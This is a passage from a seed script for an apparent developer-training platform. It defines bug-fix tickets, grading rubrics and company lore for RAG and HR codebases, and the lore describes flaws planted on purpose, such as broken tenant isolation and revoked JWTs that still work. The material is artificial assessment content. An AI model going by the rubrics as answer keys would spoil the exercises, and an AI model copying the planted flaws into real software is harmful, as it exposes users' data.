      filesInvolved: ["app/services/llm_service.py"],
      rubric: {
        diagnosis: "Did they find the existing count_messages_tokens() function and understand it is never called from chat_complete()? Did they correctly identify the missing pre-call validation as the root cause?",
        design: "Did they add the token check before the API call (not after)? Did they use the correct threshold (128000 - 2000 = 126000 tokens for messages)? Did they raise a clear ValueError?",
        communication: "Did they explain why the error is not surfaced to users? Did they describe what happens to accumulated messages over a long session?",
        execution: "Does the fix make the test_raises_when_messages_exceed_context test pass? Is the token check placed correctly before the API call, not inside the except block?",
      },
      expectedMinutes: 30,
    },
    {
      id: "ticket-rag-02-seed-id-002",
      title: "RAG-02: Streaming Endpoint Also Crashes on Long Conversations",
      description: `After fixing RAG-01 (token guard in chat_complete), the team noticed the streaming endpoint \`/api/v1/queries/stream\` has the same bug. \`stream_response()\` in \`llm_service.py\` does not check token count before starting the stream. This means long sessions crash mid-stream, causing a broken partial response in the browser.

**What's happening:**
\`chat_complete()\` was fixed in RAG-01 but \`stream_response()\` is a completely separate code path that bypasses the token guard.

**Your task:**
1. Add the same token budget check to \`stream_response()\` that you added to \`chat_complete()\` in RAG-01
2. The check must happen BEFORE the first token is yielded — a partial stream with an error at the end is worse than a clean upfront error
3. Raise \`ValueError\` with a message containing "context" if the limit is exceeded
4. Make the test \`tests/test_llm_service.py::TestTokenGuard::test_stream_raises_when_messages_exceed_context\` pass

**Files:** \`app/services/llm_service.py\``,
      difficulty: Difficulty.JUNIOR,
      filesInvolved: ["app/services/llm_service.py"],
      rubric: {
        diagnosis: "Did they identify that stream_response() is a separate code path from chat_complete() and has no token guard? Did they understand that the fix must be applied before the first yield, not after?",
        design: "Is the token check placed before any yield statement? Does it use the same threshold as RAG-01? Does it raise ValueError with 'context' in the message?",
        communication: "Did they explain why the fix must come before the first yield (partial stream is worse than a clean error)?",
        execution: "Does test_stream_raises_when_messages_exceed_context pass? Is there no way for the stream to start and then fail mid-way due to token count?",
      },
      expectedMinutes: 20,
    },
    {
      id: "ticket-rag-03-seed-id-003",
      title: "RAG-03: Search Results Are Incomplete — Chunks Too Large",
      description: `Users are reporting that when they upload a long technical document and ask a specific question, the answer often misses relevant content. The retrieval system returns only 1–2 chunks when it should return 5+. Investigation reveals that documents are being split into very few large chunks instead of many small, overlapping ones.

**Root cause:**
\`document_processor.py\` uses \`CharacterTextSplitter(separator="\\n")\`. This splitter only splits on newline characters — meaning a paragraph with no newlines becomes a single chunk regardless of length. A 10,000-word PDF with minimal newlines produces a single chunk that exceeds the embedding model's token limit.

**Your task:**
1. Replace \`CharacterTextSplitter\` with \`RecursiveCharacterTextSplitter\` from \`langchain_text_splitters\`
2. Configure it with \`chunk_size=1000\`, \`chunk_overlap=200\`, and the standard recursive separators: \`["\\n\\n", "\\n", ". ", " ", ""]\`
3. Verify the test \`tests/test_document_processor.py::TestChunkSplitting::test_splits_long_prose_into_even_chunks\` passes

**Files:** \`app/services/document_processor.py\``,
      difficulty: Difficulty.JUNIOR,
      filesInvolved: ["app/services/document_processor.py"],
      rubric: {
        diagnosis: "Did they identify that CharacterTextSplitter(separator='\\n') fails to split prose without newlines, producing oversized chunks? Did they understand that RecursiveCharacterTextSplitter falls back through a hierarchy of separators?",
        design: "Did they use RecursiveCharacterTextSplitter with chunk_size=1000, chunk_overlap=200, and the correct separator list? Did they import from langchain_text_splitters (not the deprecated langchain.text_splitter)?",
        communication: "Did they explain why the original splitter produces oversized chunks and how RecursiveCharacterTextSplitter fixes it?",
        execution: "Does the test_splits_long_prose_into_even_chunks test pass? Are all chunks ≤ 1200 characters for prose input?",
      },
      expectedMinutes: 25,
    },
    {
      id: "ticket-rag-04-seed-id-004",
      title: "RAG-04: Chat History Corrupts When Same User Sends Two Messages at Once",
      description: `A customer reports that in their web app, rapidly submitting two questions before the first answer arrives causes the conversation history to become corrupted. The model starts answering question B with context from question A, or repeats the same message twice in history.

**Root cause:**
In \`rag_chain.py\`, the \`ConversationBufferMemory\` object for each session is stored in \`_session_memory\` (a class-level dict) and retrieved by session_id. Two concurrent requests for the same session_id get the SAME memory object. Both coroutines call \`memory.save_context()\` concurrently, leading to interleaved writes.

**Your task:**
1. Add an \`asyncio.Lock\` per session to \`_session_memory\` so that only one request can write to a session's memory at a time
2. The lock should be acquired before reading/writing memory and released after
3. Store \`(memory, lock)\` tuples in the dict instead of bare memory objects
4. The test \`tests/test_rag_chain.py::TestSessionMemoryIsolation::test_concurrent_sessions_dont_corrupt_history\` should pass

**Files:** \`app/services/rag_chain.py\``,
      difficulty: Difficulty.MID,
      filesInvolved: ["app/services/rag_chain.py"],
      rubric: {
        diagnosis: "Did they identify the shared mutable memory object as the root cause? Did they understand that two coroutines can interleave writes to the same ConversationBufferMemory?",
        design: "Did they use asyncio.Lock (not threading.Lock)? Is the lock acquired before accessing the memory and released after? Is the lock stored per session (not a global lock which would serialize all requests)?",
        communication: "Did they explain why asyncio.Lock is correct here vs threading.Lock? Did they explain the exact interleaving scenario that causes corruption?",
        execution: "Does test_concurrent_sessions_dont_corrupt_history pass? Is the lock correctly scoped to the session, not global?",
      },
      expectedMinutes: 45,
    },
    {
      id: "ticket-rag-05-seed-id-005",
      title: "RAG-05: Switching Embedding Models Returns Wrong-Dimension Vectors",
      description: `The ops team upgraded the embedding model from \`text-embedding-3-small\` (1,536 dimensions) to \`text-embedding-3-large\` (3,072 dimensions). After the upgrade, some queries return a 500 error: "ChromaDB dimension mismatch — expected 1536 got 3072." Investigation shows that cached embeddings from the old model are being served for new queries.

**Root cause:**
In \`embedding_service.py\`, the Redis cache key is \`f"emb:{hashlib.md5(text.encode()).hexdigest()}"\`. The key does not include the model name. When the model changes, the old cache entries are still returned for the same text.

**Your task:**
1. Update the cache key to include the model name: \`f"emb:{self._model_name}:{hashlib.md5(text.encode()).hexdigest()}"\`
2. Make sure both \`embed_text()\` and any other method that reads from the cache use the updated key format
3. The test \`tests/test_embedding_service.py::TestCacheKey::test_different_models_dont_share_cache\` should pass

**Files:** \`app/services/embedding_service.py\``,
      difficulty: Difficulty.JUNIOR,
      filesInvolved: ["app/services/embedding_service.py"],
      rubric: {
        diagnosis: "Did they identify that the cache key is model-agnostic and that stale entries from the old model are returned when the model changes? Did they understand the dimension mismatch error flow?",
        design: "Did they update the cache key to include the model name? Did they update all cache read/write paths consistently (not just the write)?",
        communication: "Did they explain the model upgrade scenario and why the dimension mismatch happens? Did they mention cache invalidation as an alternative (but note key-based namespacing is cleaner)?",
        execution: "Does test_different_models_dont_share_cache pass? Are both embed_text() cache reads and writes using the updated key?",
      },
      expectedMinutes: 20,
    },
    {
      id: "ticket-rag-06-seed-id-006",
      title: "RAG-06: Scanned PDF Pages Silently Dropped During Ingestion",
      description: `A customer uploaded a 50-page legal contract. Half the pages were scanned images (no extractable text). After ingestion, the customer searched for a clause that appeared on a scanned page — the system returned nothing. The customer has no idea the content is missing.

**Root cause:**
In \`document_processor.py\`, \`process_pdf()\` silently skips pages with no extractable text at DEBUG log level. Users and callers receive no indication that part of their document was not indexed.

**Your task:**
1. Count the number of pages that are skipped due to no extractable text (image-only pages)
2. If any pages were skipped, emit a WARNING log (not DEBUG) with the message format: "X page(s) have no extractable text (image-only). These pages will not be searchable."
3. Return the skipped page count from \`process_pdf()\` so callers can include it in the API response
4. The test \`tests/test_document_processor.py::TestPDFProcessing::test_warns_on_image_only_page\` should pass

**Files:** \`app/services/document_processor.py\``,
      difficulty: Difficulty.JUNIOR,
      filesInvolved: ["app/services/document_processor.py"],
      rubric: {
        diagnosis: "Did they find the silent DEBUG log where image-only pages are skipped? Did they understand the user impact — customer has no idea half their document is unsearchable?",
        design: "Did they change the log level to WARNING? Does the warning message include the count of skipped pages? Is the count returned so the API can surface it to the user?",
        communication: "Did they explain the difference between DEBUG and WARNING log levels and when each is appropriate?",
        execution: "Does test_warns_on_image_only_page pass (caplog.records contains a WARNING with 'image' or 'no text')?",
      },
      expectedMinutes: 25,
    },
    {
      id: "ticket-rag-07-seed-id-007",
      title: "RAG-07: Search Returns Worst Results First",
      description: `Users report that the search results are completely backwards — the most relevant document is always at the bottom of the list, and the least relevant is at the top.

**Root cause:**
In \`vector_store.py\`, the results from ChromaDB's similarity search are sorted by relevance score in ascending order (\`reverse=False\`). Similarity scores are higher for more relevant results, so ascending order puts the worst result first.

**Your task:**
1. Find the \`sorted()\` call in \`vector_store.py\` that sorts results by score
2. Change \`reverse=False\` to \`reverse=True\` so the highest-scoring (most relevant) result comes first
3. The test \`tests/test_vector_store.py::TestSortOrder::test_top_result_has_highest_score\` should pass

**Files:** \`app/services/vector_store.py\``,
      difficulty: Difficulty.JUNIOR,
      filesInvolved: ["app/services/vector_store.py"],
      rubric: {
        diagnosis: "Did they find the sorted() call with reverse=False and understand that higher scores = more relevant?",
        design: "Is the fix just changing reverse=False to reverse=True? Nothing more complex is needed.",
        communication: "Did they explain that ChromaDB cosine similarity scores are in [0,1] where 1 = most similar?",
        execution: "Does test_top_result_has_highest_score pass? Is the fix applied to the correct sorted() call?",
      },
      expectedMinutes: 15,
    },
    {
      id: "ticket-rag-08-seed-id-008",
      title: "RAG-08: Tenant Data Isolation Broken — Users See Other Tenants' Documents",
      description: `A critical security issue has been reported. Tenant A uploaded confidential documents and queried them. The search results included chunks from Tenant B's documents. Multi-tenancy is completely broken.

**Root cause:**
In \`vector_store.py\`, the \`_collection_name()\` method returns \`"ragcore_shared"\` when \`tenant_id\` is \`None\`. This fallback is never supposed to happen in production, but a code path in the query handler passes \`None\` when the tenant lookup fails instead of raising an error. All tenants with lookup failures end up in the shared collection.

**Your task:**
1. Remove the \`"ragcore_shared"\` fallback from \`_collection_name()\`
2. If \`tenant_id\` is \`None\` or empty, raise \`ValueError("tenant_id is required for all vector store operations")\`
3. Also add this check at the entry point of \`search()\` and \`add_documents()\` before any ChromaDB call
4. The test \`tests/test_vector_store.py::TestTenantIsolation::test_none_tenant_raises_not_falls_back\` should pass

**Files:** \`app/services/vector_store.py\``,
      difficulty: Difficulty.MID,
      filesInvolved: ["app/services/vector_store.py"],
      rubric: {
        diagnosis: "Did they correctly identify this as a data isolation security bug? Did they find the fallback to 'ragcore_shared' in _collection_name()?",
        design: "Did they raise ValueError instead of silently using a shared collection? Did they add the check at the entry points of both search() and add_documents()?",
        communication: "Did they classify this as a multi-tenancy security vulnerability? Did they mention checking audit logs to determine if cross-tenant data was actually served?",
        execution: "Does test_none_tenant_raises_not_falls_back pass? Is ValueError raised (not a different exception)?",
      },
      expectedMinutes: 30,
    },
    {
      id: "ticket-rag-09-seed-id-009",
      title: "RAG-09: Retry Logic Ignores OpenAI Retry-After Header",
      description: `The API is hitting OpenAI rate limits during peak usage. The retry logic in \`llm_service.py\` does exponential backoff (1s, 2s, 4s, 8s...) but ignores the \`Retry-After\` header that OpenAI returns on 429 responses. This causes wasted retries that get rate limited again immediately.

**Root cause:**
\`chat_complete_with_retry()\` catches \`RateLimitError\` and uses \`await asyncio.sleep(2 ** attempt)\`. It never reads \`error.response.headers.get("Retry-After")\`.

**Your task:**
1. In the \`except RateLimitError\` block of \`chat_complete_with_retry()\`, read the \`Retry-After\` header from \`error.response.headers\`
2. If the header is present, sleep for that many seconds (parse as float)
3. If the header is absent, fall back to the existing \`2 ** attempt\` backoff
4. The test \`tests/test_llm_service.py::TestRetryAfterHeader::test_respects_retry_after_header\` should pass

**Files:** \`app/services/llm_service.py\``,
      difficulty: Difficulty.MID,
      filesInvolved: ["app/services/llm_service.py"],
      rubric: {
        diagnosis: "Did they find chat_complete_with_retry() and identify that the Retry-After header is present on the error object but never read?",
        design: "Is the Retry-After header read from error.response.headers? Is there a fallback to exponential backoff when the header is absent? Is the header value parsed as float (seconds)?",
        communication: "Did they explain why ignoring Retry-After causes thundering herd retries that immediately get rate limited again?",
        execution: "Does test_respects_retry_after_header pass? Is the sleep duration >= retry_after * 0.9?",
      },
      expectedMinutes: 30,
    },
    {
      id: "ticket-rag-10-seed-id-010",
      title: "RAG-10: Memory Leak — Session Chat History Grows Without Bound",
      description: `The API server's memory usage grows continuously under load and never comes down. A heap profile shows that \`RAGChain._session_memory\` — a class-level dict — is the culprit. It accumulates one entry per unique session_id and is never cleaned up. After 24 hours in production it holds 200,000+ entries.

**Root cause:**
\`_session_memory\` in \`rag_chain.py\` is a class-level dict with no eviction policy. Every chat session creates an entry that persists for the lifetime of the process.

**Your task:**
1. Replace \`_session_memory: dict\` with a size-bounded structure that evicts the least-recently-used entry when it exceeds 1,000 sessions
2. Use Python's built-in \`functools\` module (hint: \`lru_cache\` won't work here, but \`OrderedDict\` will)
3. Implement LRU eviction: on each access, move the session to the end; when the dict exceeds 1,000 entries, pop the first (oldest) entry
4. The test \`tests/test_rag_chain.py::TestSessionMemoryIsolation::test_session_memory_does_not_grow_unbounded\` should pass

**Files:** \`app/services/rag_chain.py\``,
      difficulty: Difficulty.MID,
      filesInvolved: ["app/services/rag_chain.py"],
      rubric: {
        diagnosis: "Did they identify the class-level dict with no eviction as the memory leak source? Did they understand that every unique session_id creates a permanent entry?",
        design: "Did they use OrderedDict (or equivalent) with a max size of 1,000? Is the LRU eviction implemented (move-to-end on access, pop-first when over limit)?",
        communication: "Did they explain why a class-level dict retains entries for the process lifetime? Did they discuss the trade-off: LRU means very old sessions lose chat history, which is acceptable.",
        execution: "Does test_session_memory_does_not_grow_unbounded pass (len < 200 after inserting 200)? Is the max size configurable?",
      },
      expectedMinutes: 40,
    },
    {
      id: "ticket-rag-11-seed-id-011",
      title: "RAG-11: Deleting a Document Leaves Orphaned Vectors in ChromaDB",
      description: `Customers who delete documents to free up storage are surprised to find that their search results still include content from deleted documents. The documents are gone from the UI but the embeddings remain searchable.

**Root cause:**
In \`app/api/documents.py\`, \`delete_document()\` deletes the PostgreSQL record but never calls \`vector_store.delete_document()\` to remove the corresponding vectors from ChromaDB. The vectors are orphaned and remain searchable indefinitely.

**Your task:**
1. In the \`delete_document()\` route handler in \`app/api/documents.py\`, after deleting the DB record, call the vector store's delete method to remove all chunks for that document
2. The vector store deletion should use the \`document_id\` as the filter key (ChromaDB supports \`where={"document_id": doc_id}\`)
3. If the vector store deletion fails, log a WARNING but still return 204 — the DB record is gone, partial cleanup is better than blocking the response
4. Write a brief note in your PR description about why ordering matters here (DB first vs vector first)

**Files:** \`app/api/documents.py\`, \`app/services/vector_store.py\``,
      difficulty: Difficulty.MID,
      filesInvolved: ["app/api/documents.py", "app/services/vector_store.py"],
      rubric: {
        diagnosis: "Did they find that delete_document() only deletes the Postgres row and never touches ChromaDB? Did they understand the symptom — deleted content still appears in search?",
        design: "Did they call vector_store.delete_document(doc_id, tenant_id) after the DB delete? Did they handle vector store failure gracefully (log WARNING, still return 204)?",
        communication: "Did their PR note explain why DB is deleted first (if vector store fails, user can retry; if DB is gone and vector store succeeds, we have orphaned vectors with no way to track them)?",
        execution: "Is the vector store delete called with the correct document_id filter? Is the error handling correct (WARNING log, 204 response)?",
      },
      expectedMinutes: 35,
    },
    {
      id: "ticket-rag-12-seed-id-012",
      title: "RAG-12: Concurrent Document Uploads Create Duplicate Embeddings",
      description: `A customer with a flaky upload client accidentally uploaded the same PDF twice in rapid succession. Their search results now return duplicate paragraphs for every query. The document appears once in the document list but the vectors are doubled.

**Root cause:**
\`document_processor.py\` has no idempotency guard. If two requests start ingesting the same \`document_id\` concurrently, both complete successfully — producing double the chunks in ChromaDB.

**Your task:**
1. Add an idempotency check at the start of \`ingest()\`: query the database for a document with the given \`document_id\` that has status \`"ready"\`
2. If such a document already exists, skip ingestion and return early (log INFO: "Document {doc_id} already ingested, skipping")
3. Use a database row-level mechanism or status transition to prevent two concurrent ingestions of the same ID (hint: set status to "processing" atomically using an upsert before starting the heavy work)
4. The test \`tests/test_document_processor.py::TestIdempotency::test_concurrent_upload_same_id_no_duplicates\` should pass

**Files:** \`app/services/document_processor.py\``,
      difficulty: Difficulty.MID,
      filesInvolved: ["app/services/document_processor.py"],
      rubric: {
        diagnosis: "Did they identify the missing idempotency check as the root cause? Did they understand that two concurrent requests both pass the initial check before either commits?",
        design: "Is the idempotency check atomic (using a DB upsert or SELECT FOR UPDATE, not just a SELECT)? Does the check happen before the expensive embedding work?",
        communication: "Did they explain why a simple SELECT then INSERT is still racy and why an atomic upsert is required?",
        execution: "Does test_concurrent_upload_same_id_no_duplicates pass (store_chunks called exactly once)? Is the check placed before the heavy work?",
      },
      expectedMinutes: 45,
    },
    {
      id: "ticket-rag-13-seed-id-013",
      title: "RAG-13: Embedding Large Documents Is 10x Slower Than It Should Be",
      description: `Document ingestion is taking 60–90 seconds for large PDFs. Profiling shows that the bottleneck is the embedding step: \`embed_chunks()\` calls \`embed_query()\` in a loop, making one API call per chunk. A 100-chunk document makes 100 sequential API calls.

**Root cause:**
In \`embedding_service.py\`, \`embed_chunks()\` iterates over chunks and calls \`embed_query()\` for each. OpenAI's embeddings API supports batching — you can send all texts in a single API call using \`aembed_documents()\`.

**Your task:**
1. Replace the loop in \`embed_chunks()\` with a single call to \`self._embeddings.aembed_documents(chunks)\`
2. \`aembed_documents()\` returns a list of embeddings in the same order as the input chunks
3. Ensure the return type is still \`list[list[float]]\`
4. The test \`tests/test_embedding_service.py::TestBatchEmbedding::test_embed_chunks_uses_batch_api\` should pass

**Files:** \`app/services/embedding_service.py\``,
      difficulty: Difficulty.JUNIOR,
      filesInvolved: ["app/services/embedding_service.py"],
      rubric: {
        diagnosis: "Did they identify the N sequential API calls as the bottleneck and understand that aembed_documents() batches them into one call?",
        design: "Did they replace the loop with a single aembed_documents() call? Is the return type preserved (list[list[float]])?",
        communication: "Did they quantify the improvement — O(N) API calls → O(1)?",
        execution: "Does test_embed_chunks_uses_batch_api pass (aembed_documents called exactly once)?",
      },
      expectedMinutes: 20,
    },
    {
      id: "ticket-rag-14-seed-id-014",
      title: "RAG-14: Low-Quality Search Results Returned — Relevance Threshold Not Applied",
      description: `Users are complaining that search results sometimes include completely irrelevant content. A search for "quarterly revenue figures" returns chunks about "annual employee satisfaction survey" with a similarity score of 0.41.

**Root cause:**
In \`vector_store.py\`, there is a constant \`RELEVANCE_THRESHOLD = 0.72\` defined at the top of the class. The \`search()\` method retrieves results from ChromaDB with scores but never filters out results below the threshold.

**Your task:**
1. In the \`search()\` method, after retrieving results with scores from ChromaDB, filter out any result where the similarity score is below \`RELEVANCE_THRESHOLD\`
2. Apply this filter AFTER sorting (RAG-07 fix) and BEFORE returning to the caller
3. If filtering leaves zero results, return an empty list (do not fall back to returning low-quality results)
4. The test \`tests/test_vector_store.py::TestRelevanceThreshold::test_low_score_docs_filtered_out\` should pass

**Files:** \`app/services/vector_store.py\``,
      difficulty: Difficulty.JUNIOR,
      filesInvolved: ["app/services/vector_store.py"],
      rubric: {
        diagnosis: "Did they find RELEVANCE_THRESHOLD = 0.72 already defined in the class but never used? Did they locate the correct place in search() to apply the filter?",
        design: "Is the filter applied after sorting and before the return? Does it correctly keep only results where score >= RELEVANCE_THRESHOLD? Does it return [] when all results are below threshold?",
        communication: "Did they explain why zero results is better than low-quality results for a RAG system?",
        execution: "Does test_low_score_docs_filtered_out pass ('noise' document with score 0.40 is excluded)?",
      },
      expectedMinutes: 20,
    },
    {
      id: "ticket-rag-15-seed-id-015",
      title: "RAG-15: Large File Upload Loads Entire File Into Memory Before Processing",
      description: `The API server crashes with OOM (Out of Memory) when a user uploads a file larger than 200MB. The server has 512MB of RAM. Investigation shows that the entire file content is loaded into memory before the background processing task starts.

**Root cause:**
In \`app/api/documents.py\`, \`ingest_document()\` calls \`await file.read()\` which reads the entire file into a bytes object before passing it to the background task. For a 300MB file this exhausts available memory.

**Your task:**
1. Instead of reading the file content in the request handler with \`await file.read()\`, save the uploaded file to a temporary file path on disk first
2. Pass the file path to the background task instead of the bytes content
3. Use Python's \`tempfile.mkstemp()\` to create the temp file, write the content in chunks using \`aiofiles\`, and pass the path
4. The background task should delete the temp file after processing is complete
5. Add a file size check: reject uploads larger than \`settings.MAX_UPLOAD_SIZE_MB\` MB with HTTP 413 before any file I/O

**Files:** \`app/api/documents.py\``,
      difficulty: Difficulty.MID,
      filesInvolved: ["app/api/documents.py"],
      rubric: {
        diagnosis: "Did they find the await file.read() call that loads the entire file into memory? Did they understand that the background task receives the bytes AFTER the request handler has already buffered everything?",
        design: "Did they replace file.read() with streaming to disk using aiofiles? Did they pass a file path to the background task? Did they add cleanup of the temp file after processing? Did they add the 413 size check?",
        communication: "Did they explain the memory model: await file.read() blocks the event loop AND holds the bytes in memory until GC, while streaming to disk is O(chunk_size) memory?",
        execution: "Is the temp file approach implemented correctly (mkstemp + aiofiles chunked write)? Is the cleanup in a finally block or background task? Is the 413 check placed before any file I/O?",
      },
      expectedMinutes: 50,
    },
  ];

  for (const t of ragTickets) {
    await prisma.ticket.upsert({
      where: { id: t.id },
      update: {},
      create: { ...t, stack: Stack.PYTHON, codebaseId: ragCodebase.id },
    });
  }

  // ── TechCorp HRM codebase ─────────────────────────────────────────────────
  const techCorpCodebase = await prisma.codebase.upsert({
    where: { id: "techcorp-hrm-seed-id-001" },
    update: {},
    create: {
      id: "techcorp-hrm-seed-id-001",
      name: "TechCorp HRM",
      stack: Stack.NODE,
      repoUrl: "https://github.com/DevSimulate/TechCropCrm",
      description: "A multi-tenant HR Management platform built with Node.js, TypeScript, Express, PostgreSQL, Redis, and BullMQ. Handles employee records, payroll, leave management, and department structure.",
      companyLore: `TechCorp Solutions was founded in 2019 to build affordable HR software for small and mid-size businesses. The product grew faster than expected — what started as a simple employee directory now processes payroll for 340 companies and 85,000 employees.

The engineering team is 8 developers split across two squads: Core Platform and Payroll. The codebase was initially built by two contractors who left in 2022. The current team inherited it with minimal documentation.

Key architectural decisions engineers must understand:
- Multi-tenancy is enforced by passing tenant_id on every query — there is NO row-level security at the database level. Any query that omits tenant_id exposes cross-tenant data.
- JWT tokens expire after 8 hours. A Redis blacklist is maintained on logout BUT the auth middleware does not check it — logged-out tokens are still valid.
- Payroll runs are processed via BullMQ background jobs. The worker retries all failures including permanent validation errors.
- Leave balances are checked and deducted in two separate operations with no database lock — concurrent requests can overdraw the balance.
- PDF payslips are generated synchronously using PDFKit — this blocks the event loop during generation.
- The Redis cache has no TTL on any key — stale data accumulates indefinitely.

Known production incidents:
- Three customers in Singapore reported their leave expired on December 30 instead of December 31
- A support ticket noted that a terminated employee could still log in the next day
- A payroll admin accidentally deleted a department — 23 employees disappeared from all reports
- The API slows to a crawl during end-of-month payroll runs (bulk PDF generation)`,
    },
  });

  const techCorpTickets = [
    {
      id: "ticket-hrm-01-seed-id-001",
      title: "HRM-01: Employee List Takes 40 Seconds to Load",
      description: `The main employee dashboard loads in under 2 seconds for companies with fewer than 50 employees. For TechCorp's larger customers (200–500 employees) it takes 40–60 seconds and sometimes times out entirely.

**What's happening:**
\`GET /api/v1/employees\` calls \`getEmployeesWithDepartment()\` in \`employee.service.ts\`. Look at what happens after the initial employee fetch.

**Your task:**
1. Find the N+1 query pattern in \`getEmployeesWithDepartment()\`
2. Replace it with a single SQL query using a JOIN between \`employees\` and \`departments\`
3. The response shape must remain the same — each employee object should still include a \`department\` property (or \`null\` if unassigned)
4. Measure the query count before and after: it should go from N+1 queries to exactly 1

**Files:** \`src/services/employee.service.ts\`, \`src/repositories/employee.repository.ts\``,
      difficulty: Difficulty.JUNIOR,
      filesInvolved: ["src/services/employee.service.ts", "src/repositories/employee.repository.ts"],
      rubric: {
        diagnosis: "Did they identify the for-loop with a per-employee SELECT as the N+1 pattern? Did they understand that the number of queries scales linearly with employee count?",
        design: "Did they rewrite it as a single LEFT JOIN query? Is the JOIN between employees and departments correct (LEFT JOIN to preserve employees without a department)?",
        communication: "Did they explain why N+1 is invisible in dev (small dataset) but catastrophic in production (500 employees = 501 queries)?",
        execution: "Does the fix use exactly 1 query? Is the response shape preserved (employee + department or null)?",
      },
      expectedMinutes: 30,
    },
    {
      id: "ticket-hrm-02-seed-id-002",
      title: "HRM-02: Logged-Out Users Can Still Make API Requests",
      description: `A security audit found that after calling \`POST /api/v1/auth/logout\`, the JWT token remains fully functional. An attacker who intercepts a token (from logs, a browser extension, or a network capture) can keep using it for up to 8 hours after the legitimate user logs out.

**What's happening:**
The logout endpoint calls \`authService.logout()\` which correctly adds the token to a Redis blacklist. But \`auth.middleware.ts\` never checks the blacklist — it only verifies the JWT signature.

**Your task:**
1. In \`auth.middleware.ts\`, after verifying the JWT signature, check Redis for the key \`blacklist:<token>\`
2. If the key exists, reject the request with 401 \`"Token has been revoked"\`
3. The Redis check should only add ~1ms of latency — use \`redis.get()\` not a scan

**Files:** \`src/middleware/auth.middleware.ts\`, \`src/config/redis.ts\``,
      difficulty: Difficulty.MID,
      filesInvolved: ["src/middleware/auth.middleware.ts", "src/config/redis.ts"],
      rubric: {
        diagnosis: "Did they find that logout() correctly blacklists the token but requireAuth() never reads the blacklist? Did they trace the full flow: logout → Redis write → next request → Redis NOT checked?",
        design: "Is the Redis check placed after JWT verification (to avoid a Redis lookup on already-invalid tokens)? Does it use redis.get() not a more expensive operation? Does it return 401 with a clear message?",
        communication: "Did they explain the attack scenario — token interception after logout? Did they note the latency implication of adding a Redis round-trip to every authenticated request?",
        execution: "Does the middleware reject requests using a blacklisted token? Is the check placed correctly (after signature verification, not before)?",
      },
      expectedMinutes: 35,
    },
    {
      id: "ticket-hrm-03-seed-id-003",
      title: "HRM-03: Employees Can Book More Leave Than Their Balance Allows",
      description: `HR managers are finding employees with negative leave balances. One employee used 28 days of annual leave against an entitlement of 21. It only happens when employees submit multiple leave requests at nearly the same time — the mobile app sometimes double-submits on poor connections.

**What's happening:**
\`requestLeave()\` in \`leave.service.ts\` reads the balance, checks if there's enough, then deducts. Two concurrent requests both read the same balance before either deducts — both pass the check.

**Your task:**
1. Fix the race condition in \`requestLeave()\` using a PostgreSQL advisory lock or an atomic UPDATE with a WHERE condition that checks the remaining balance
2. The fix must prevent double-booking even under concurrent requests — a simple \`SELECT FOR UPDATE\` on the balance row is acceptable
3. If the balance check fails due to a concurrent deduction, return the same "Insufficient balance" error

**Files:** \`src/services/leave.service.ts\``,
      difficulty: Difficulty.SENIOR,
      filesInvolved: ["src/services/leave.service.ts"],
      rubric: {
        diagnosis: "Did they identify the read-check-write sequence with no lock as the root cause? Did they understand that the race window is between getBalance() and the UPDATE deduction?",
        design: "Did they use SELECT FOR UPDATE, an atomic UPDATE WHERE remaining >= days, or a database transaction with row lock? Is the lock released correctly after the deduction?",
        communication: "Did they explain why this is invisible in single-request testing? Did they describe the exact race window and why normal transactions don't prevent it without a lock?",
        execution: "Does the fix prevent negative balances under concurrent requests? Is the error message the same as before so callers don't break?",
      },
      expectedMinutes: 60,
    },
    {
      id: "ticket-hrm-04-seed-id-004",
      title: "HRM-04: API Memory Grows 50MB After Every Payroll Run",
      description: `Ops has noticed that after each monthly payroll run, API memory jumps by ~50MB and never comes back down. After 6 payroll runs the server is using 400MB extra and starts swapping. Node.js emits \`MaxListenersExceededWarning: Possible EventEmitter memory leak detected. 11 payrollProcessed listeners added.\`

**What's happening:**
\`notification.service.ts\` extends \`EventEmitter\`. \`sendPayrollNotifications()\` registers a new \`'payrollProcessed'\` listener for each employee on every call — listeners are never removed.

**Your task:**
1. Fix \`sendPayrollNotifications()\` in \`notification.service.ts\` so it does not register persistent listeners
2. The simplest correct fix is to emit the event with the employee list as the payload and handle it in a single listener — or just call \`sendEmail()\` directly without using events
3. After the fix, calling \`sendPayrollNotifications()\` 100 times must not increase listener count

**Files:** \`src/services/notification.service.ts\``,
      difficulty: Difficulty.SENIOR,
      filesInvolved: ["src/services/notification.service.ts"],
      rubric: {
        diagnosis: "Did they find that this.on() inside a loop adds one listener per employee per call, and those listeners are never removed? Did they understand that EventEmitter listeners are permanent until explicitly removed?",
        design: "Did they remove the this.on() pattern from inside the method? The cleanest fix is to call sendEmail() directly in the loop without using events, or emit once with all employees as payload. Did they avoid using this.once() in a loop (still leaks, just slower)?",
        communication: "Did they explain why the MaxListenersExceededWarning is a symptom, not the root cause? Did they note the memory retention: each closure captures the emp object keeping it in memory?",
        execution: "Does the fix keep listener count stable across multiple calls? Is the email notification behaviour preserved (all employees still get notified)?",
      },
      expectedMinutes: 45,
    },
    {
      id: "ticket-hrm-05-seed-id-005",
      title: "HRM-05: Payroll Calculations Silently Return NaN",
      description: `Finance has flagged payroll reports showing \`NaN\` in the net pay column for several employees. The payroll run succeeds with no errors — the bug is completely silent. Affected employees have active deductions set up in the system.

**What's happening:**
\`calculateNetPay()\` in \`payroll.service.ts\` calls \`this.calculateDeductions()\` which is an \`async\` function returning \`Promise<number>\`. But the \`await\` keyword is missing — \`deductions\` holds a \`Promise\` object, not a number. \`base - Promise\` evaluates to \`NaN\`.

**Your task:**
1. Find the missing \`await\` in \`calculateNetPay()\`
2. Add it — the fix is one word
3. Add a runtime guard: if \`netPay\` is \`NaN\` or negative, throw an Error before writing to the database rather than persisting an invalid value

**Files:** \`src/services/payroll.service.ts\``,
      difficulty: Difficulty.JUNIOR,
      filesInvolved: ["src/services/payroll.service.ts"],
      rubric: {
        diagnosis: "Did they find the missing await on calculateDeductions()? Did they understand that async functions always return a Promise, and subtracting a Promise from a number yields NaN in JavaScript?",
        design: "Did they add await? Did they add a NaN/negative guard before the DB write? A single isNaN() check and throw is sufficient.",
        communication: "Did they explain why TypeScript doesn't catch this — calculateDeductions returns Promise<number> and the compiler allows arithmetic on it without strict null checks? Did they note it's completely silent (no throw, no log)?",
        execution: "Does the fix make calculateNetPay() return the correct numeric value? Does the guard throw before a NaN value reaches the database?",
      },
      expectedMinutes: 20,
    },
    {
      id: "ticket-hrm-06-seed-id-006",
      title: "HRM-06: Leave Expires a Day Early for Employees in Pakistan and Singapore",
